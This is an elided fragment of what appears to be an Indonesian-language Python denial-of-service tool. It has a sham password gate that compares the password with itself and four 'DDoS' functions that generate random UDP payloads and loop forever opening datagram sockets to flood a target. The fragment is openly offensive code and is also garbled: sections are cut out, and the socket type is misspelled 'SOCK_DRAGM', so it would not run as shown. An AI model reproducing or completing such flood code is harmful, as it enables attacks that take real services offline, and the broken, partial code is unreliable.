...
for i in range(3):
	...
	if(password==password):
		time.sleep(5)
		print(pink+b+"[Σ] Passwod Berhas Tunggu 5 Detik!!!"+b+pink)
		break
	else:
		time.sleep(5)
...
def DDoS():
	bytes = random._urandom(578)
	pack = random._urandom(578)
...
def DDoS2():
	bytes = random._urandom(584)
	pack = random._urandom(584)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
...
def DDoS3():
	bytes = random._urandom(594)
	pack = random._urandom(594)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DRAGM)
...
def DDoS4():
	bytes = random._urandom(588)
	pack = random._urandom(588)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DRAGM)
